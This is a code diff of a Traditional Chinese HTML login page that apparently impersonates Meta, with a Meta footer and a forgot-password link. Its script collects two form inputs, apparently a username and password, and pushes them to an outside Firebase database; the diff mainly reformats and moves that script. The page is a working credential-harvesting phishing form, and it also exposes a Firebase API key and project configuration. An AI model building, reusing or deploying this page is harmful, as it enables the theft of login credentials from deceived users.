@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -23,9 +22,11 @@
         <div class="forgot-password">忘記密碼？</div>
         <footer>© Meta</footer>
     </div>
-    <script>
-      const firebaseConfig = {
-        apiKey: "AIzaSyDUIA_sXWE_iQU5T_YQ0_LDjnA7rsQ7Qjg",
+</body>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyDUIA_sXWE_iQ5UT_YQ0_LDjnA7rsQ7Qjg",
         authDomain: "emotion-a33d0.firebaseapp.com",
         databaseURL: "https://emotion-a33d0-default-rtdb.firebaseio.com",
         projectId: "emotion-a33d0",
@@ -33,36 +34,36 @@
         messagingSenderId: "99528384914",
         appId: "1:99528384914:web:d9c92b81a4eefe8310a14b",
         measurementId: "G-MG9PEQN96M"
-      };
+    };
 
-      const app = firebase.initializeApp(firebaseConfig);
-      const database = firebase.database();
+    const app = firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
 
-      document.getElementById("submitBtn").addEventListener("click", function () {
+    document.getElementById("submitBtn").addEventListener("click", function () {
         const input1 = document.getElementById("input1").value.trim();
         const input2 = document.getElementById("input2").value.trim();
 
         if (input1 === "" || input2 === "") {
-          alert("請填寫完整資料");
-          return;
+            alert("請填寫完整資料");
+            return;
         }
 
         const newData = {
-          input1: input1,
-          input2: input2,
-          timestamp: new Date().toISOString()
+            input1: input1,
+            input2: input2,
+            timestamp: new Date().toISOString()
         };
 
         database.ref('userInputs').push(newData)
-          .then(() => {
-            alert("✅ 資料已儲存");
-            document.getElementById("input1").value = "";
-            document.getElementById("input2").value = "";
-          })
-          .catch((error) => {
-            alert("❌ 儲存失敗：" + error);
-          });
-      });
-    </script>
-</body>
+            .then(() => {
+                alert("✅ 資料已儲存");
+                document.getElementById("input1").value = "";
+                document.getElementById("input2").value = "";
+            })
+            .catch((error) => {
+                alert("❌ 儲存失敗：" + error);
+            });
+    });
+</script>
+
 </html>
